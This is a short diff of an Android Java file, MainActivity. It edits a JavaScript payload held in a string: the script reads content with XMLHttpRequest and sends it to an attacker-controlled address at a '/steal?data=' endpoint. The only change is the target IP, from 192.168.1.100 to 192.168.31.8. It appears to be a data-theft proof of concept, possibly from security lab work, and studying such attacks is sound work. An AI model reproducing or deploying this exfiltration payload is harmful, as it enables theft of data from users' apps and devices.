@@ -48,7 +48,7 @@ public class MainActivity extends Activity {
                     "request.send(null);" +
                     "var result = request.responseText;" +
                     "var exfiltrate = new XMLHttpRequest();" +
-                    "exfiltrate.open('GET', 'http://192.168.1.100:8000/steal?data=' + encodeURIComponent(result), false);" +
+                    "exfiltrate.open('GET', 'http://192.168.31.8:8000/steal?data=' + encodeURIComponent(result), false);" +
                     "exfiltrate.send(null);" +
                     "</script>";
 
